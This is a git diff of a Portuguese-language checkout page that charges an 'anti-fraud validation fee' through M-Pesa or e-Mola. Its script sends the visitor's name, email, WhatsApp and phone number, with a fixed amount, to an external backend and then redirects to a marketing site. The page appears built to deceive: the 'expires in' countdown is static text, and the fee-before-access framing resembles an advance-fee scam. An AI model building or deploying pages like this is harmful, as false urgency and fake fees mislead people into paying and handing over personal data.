@@ -2,134 +2,142 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Taxa Anti-Fraude</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <style>
-    body {
-      background-color: #d1d5db;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-    }
-    .constrained-width {
-      max-width: 32rem;
-      margin: auto;
-      padding: 0 1rem;
-    }
+    body { background-color: #d1d5db; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; }
+    .constrained-width { max-width: 32rem; margin: auto; padding: 0 1rem; }
+    .payment-option { flex: 1; text-align: center; border: 2px solid #ccc; padding: 12px; border-radius: 8px; cursor: pointer; background: white; transition: all 0.2s; }
+    .payment-option.selected { border-color: #049D43; background-color: #e8f5e9; }
+    #overlay-processando { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.7); display: none; justify-content: center; align-items: center; z-index: 9999; }
+    .loader-circle { width: 140px; height: 140px; border: 10px solid #4ade80; border-top: 10px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; display: flex; justify-content: center; align-items: center; font-size: 32px; font-weight: bold; color: white; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
-  <!-- BARRA DE CONTAGEM -->
   <div style="background-color: #111827; color: #fff; text-align: center; padding: 0.5rem; font-weight: 500; font-size: 0.9rem;">
     PAGAMENTO DA TAXA expira em: 01:56
   </div>
 
-  <!-- AVISO -->
-  <header class="w-full p-3 text-center text-sm font-semibold shadow-md" style="background-color: #1ed760; color: #fff;">
-    Taxa de Validação - Antifraude
-  </header>
+  <main id="checkout-container" class="space-y-6 pb-6">
+    <header style="background-color: #1ed760; color: #ffffff;" class="w-full p-3 text-center text-sm font-semibold shadow-md">Taxa de Validação - Antifraude</header>
 
-  <!-- IMAGEM -->
-  <div class="constrained-width">
-    <div class="w-full bg-gray-200 overflow-hidden rounded-[21px]">
-      <img src="https://dlzpblyjxiqfa.cloudfront.net/205487289/checkout-builder/e7mbjaftavxzhavgt9ohra3s5" alt="Banner" class="w-full object-cover" />
-    </div>
-  </div>
-
-  <!-- FORMULÁRIO -->
-  <div class="constrained-width mt-6">
-    <div class="bg-white shadow-lg p-6 sm:p-8 rounded-[21px]">
-      <div class="flex items-center mb-6">
-        <span class="text-white bg-[#1ed760] rounded-full h-8 w-8 flex items-center justify-center font-bold text-lg mr-3">
-          <svg xmlns="http://www.w3.org/2000/svg" fill="none" class="w-5 h-5" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 6a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0zM4.5 20.1a7.5 7.5 0 0115 0A17.9 17.9 0 0112 21.75a17.9 17.9 0 01-7.5-1.65z" />
-          </svg>
-        </span>
-        <h2 class="text-xl font-bold text-gray-800">Identifique-se</h2>
+    <div class="constrained-width">
+      <div class="w-full bg-gray-200 overflow-hidden rounded-[21px]">
+        <img src="https://dlzpblyjxiqfa.cloudfront.net/205487289/checkout-builder/e7mbjaftavxzhavgt9ohra3s5" alt="Banner" class="w-full object-cover" />
       </div>
-      <div class="space-y-4">
-        <div>
-          <label for="name" class="block text-sm font-medium text-gray-600 mb-1">Nome e sobrenome</label>
-          <input type="text" id="name" placeholder="Nome e sobrenome" class="w-full p-3 bg-gray-50 border border-gray-300 rounded-[14px] focus:outline-none focus:ring-2 focus:ring-[#1ed760]" />
-        </div>
-        <div>
-          <label for="email" class="block text-sm font-medium text-gray-600 mb-1">E-mail</label>
-          <input type="email" id="email" placeholder="E-mail" class="w-full p-3 bg-gray-50 border border-gray-300 rounded-[14px] focus:outline-none focus:ring-2 focus:ring-[#1ed760]" />
+    </div>
+
+    <div class="constrained-width">
+      <div class="shadow-lg p-6 sm:p-8 bg-white rounded-[21px]">
+        <h2 class="text-xl font-bold text-gray-800 mb-4">Identifique-se</h2>
+        <div class="space-y-4">
+          <div>
+            <label class="block text-sm font-medium text-gray-600 mb-1">Nome e sobrenome</label>
+            <input type="text" id="nome" class="w-full p-3 bg-gray-50 border border-gray-300 rounded-md" placeholder="Nome e sobrenome">
+          </div>
+          <div>
+            <label class="block text-sm font-medium text-gray-600 mb-1">E-mail</label>
+            <input type="email" id="email" class="w-full p-3 bg-gray-50 border border-gray-300 rounded-md" placeholder="E-mail">
+          </div>
+          <div>
+            <label class="block text-sm font-medium text-gray-600 mb-1">WhatsApp</label>
+            <input type="text" id="whatsapp" class="w-full p-3 bg-gray-50 border border-gray-300 rounded-md" placeholder="Número WhatsApp">
+          </div>
         </div>
       </div>
     </div>
-  </div>
 
-  <!-- BOTÃO PAGAMENTO DESATIVADO -->
-  <div class="constrained-width mt-6">
-    <div class="bg-white shadow-lg p-6 sm:p-8 rounded-[21px]">
-      <div class="flex items-center mb-4">
-        <span class="text-white bg-[#1ed760] rounded-full h-8 w-8 flex items-center justify-center font-bold text-lg mr-3">
-          <svg xmlns="http://www.w3.org/2000/svg" fill="none" class="w-5 h-5" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M2.25 8.25h19.5M5.25 14.25h6m-6 2.25h3M4.5 21h15a2.25 2.25 0 002.25-2.25V6.75A2.25 2.25 0 0019.5 4.5h-15A2.25 2.25 0 002.25 6.75v10.5A2.25 2.25 0 004.5 21z"/>
-          </svg>
-        </span>
-        <h2 class="text-xl font-bold text-gray-800">Pagamento</h2>
+    <div class="constrained-width">
+      <div class="shadow-lg p-6 sm:p-8 bg-white rounded-[21px]">
+        <h2 class="text-xl font-bold text-gray-800 mb-4">Pagamento</h2>
+
+        <div class="flex gap-2 mb-4">
+          <div class="payment-option" onclick="selecionarMetodo(this, 'mpesa')">M-Pesa</div>
+          <div class="payment-option" onclick="selecionarMetodo(this, 'emola')">e-Mola</div>
+        </div>
+
+        <div id="campo-telefone" style="display: none;" class="mb-4">
+          <label class="block text-sm font-medium text-gray-600 mb-1">Número de telefone</label>
+          <input type="text" id="telefone" class="w-full p-3 bg-gray-50 border border-gray-300 rounded-md" placeholder="84/85/86/87 xxxxxx">
+        </div>
+
+        <button onclick="enviarPagamento()" id="btn-pagar" class="w-full p-4 bg-[#1ed760] text-white font-bold text-lg uppercase rounded-[17px]">PAGAR TAXA</button>
       </div>
-      <button disabled class="w-full p-4 bg-[#1ed760] text-white font-bold text-lg uppercase rounded-[17px] opacity-60 cursor-not-allowed">
-        PAGAR TAXA
-      </button>
-      <p class="mt-4 text-center text-gray-500 text-sm">Pagamento via <strong>PIX</strong> com aprovação imediata.</p>
+    </div>
+  </main>
+
+  <div id="overlay-processando">
+    <div class="loader-circle">
+      <span id="contador">45</span>
     </div>
   </div>
 
-  <!-- BENEFÍCIOS -->
-  <div class="constrained-width mt-6">
-    <div class="bg-white shadow-lg rounded-[21px] divide-y divide-gray-200">
-      <div class="p-4 flex items-center space-x-4">
-        <div class="w-12 h-12 rounded-lg bg-green-100 flex items-center justify-center text-green-600">
-          <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M6.228 6.228L3 3m0 0a10.5 10.5 0 0118 9c0 4.97-3.516 9.123-8.25 10.248C7.516 21.123 3 16.97 3 12A10.5 10.5 0 013 3z"/>
-          </svg>
-        </div>
-        <div>
-          <h4 class="font-bold text-gray-800">Dados protegidos</h4>
-          <p class="text-sm text-gray-600">Os seus dados são confidenciais e seguros.</p>
-        </div>
-      </div>
-      <div class="p-4 flex items-center space-x-4">
-        <div class="w-12 h-12 rounded-lg bg-green-100 flex items-center justify-center text-green-600">
-          <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M16.5 10.5V6.75a4.5 4.5 0 00-9 0v3.75"/>
-          </svg>
-        </div>
-        <div>
-          <h4 class="font-bold text-gray-800">Pagamento 100% Seguro</h4>
-          <p class="text-sm text-gray-600">As informações desta compra são criptografadas.</p>
-        </div>
-      </div>
-      <div class="p-4 flex items-center space-x-4">
-        <div class="w-12 h-12 rounded-lg bg-green-100 flex items-center justify-center text-green-600">
-          <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M12 21.75l-3.75-3.75M12 21.75l3.75-3.75"/>
-          </svg>
-        </div>
-        <div>
-          <h4 class="font-bold text-gray-800">Conteúdo Aprovado</h4>
-          <p class="text-sm text-gray-600">100% revisado e aprovado por profissionais.</p>
-        </div>
-      </div>
-      <div class="p-4 flex items-center space-x-4">
-        <div class="w-12 h-12 rounded-lg bg-green-100 flex items-center justify-center text-green-600">
-          <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75"/>
-          </svg>
-        </div>
-        <div>
-          <h4 class="font-bold text-gray-800">Garantia de 7 dias</h4>
-          <p class="text-sm text-gray-600">Você está protegido por uma garantia de satisfação.</p>
-        </div>
-      </div>
-    </div>
-  </div>
+  <script>
+    let metodoSelecionado = '';
 
-  <!-- AVISO FINAL -->
-  <div class="constrained-width mt-6">
-    <p class="text-center text-sm text-gray-500">Acesso Liberado APÓS o Pagamento da Taxa</p>
-  </div>
+    function selecionarMetodo(el, metodo) {
+      metodoSelecionado = metodo;
+      document.querySelectorAll('.payment-option').forEach(opt => opt.classList.remove('selected'));
+      el.classList.add('selected');
+      document.getElementById('campo-telefone').style.display = 'block';
+    }
+
+    function enviarPagamento() {
+      const nome = document.getElementById('nome').value.trim();
+      const email = document.getElementById('email').value.trim();
+      const whatsapp = document.getElementById('whatsapp').value.trim();
+      const telefone = document.getElementById('telefone').value.trim();
+      const btn = document.getElementById('btn-pagar');
+
+      if (!nome || !email || !whatsapp || !telefone || !metodoSelecionado) {
+        alert('Preencha todos os campos.');
+        return;
+      }
+
+      btn.disabled = true;
+      document.getElementById('overlay-processando').style.display = 'flex';
+      let tempo = 45;
+      const contador = document.getElementById('contador');
+      const intervalo = setInterval(() => {
+        tempo--;
+        contador.textContent = tempo;
+        if (tempo <= 0) {
+          clearInterval(intervalo);
+          document.getElementById('overlay-processando').style.display = 'none';
+          btn.disabled = false;
+        }
+      }, 1000);
+
+      fetch('https://checkout-backend-production-4047.up.railway.app/api/pagar', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          nome, email, whatsapp,
+          phone: telefone,
+          metodo: metodoSelecionado,
+          amount: "197",
+          reference: "pesqui2"
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        clearInterval(intervalo);
+        document.getElementById('overlay-processando').style.display = 'none';
+        if (data.status === 'ok') {
+          alert('Pagamento aprovado!');
+          window.location.href = 'https://lifeboostsecrets.online/obg/';
+        } else {
+          alert('Erro: ' + (data.message || 'Falha ao processar pagamento'));
+        }
+      })
+      .catch(err => {
+        clearInterval(intervalo);
+        document.getElementById('overlay-processando').style.display = 'none';
+        alert('Erro inesperado.');
+      });
+    }
+  </script>
 </body>
 </html>
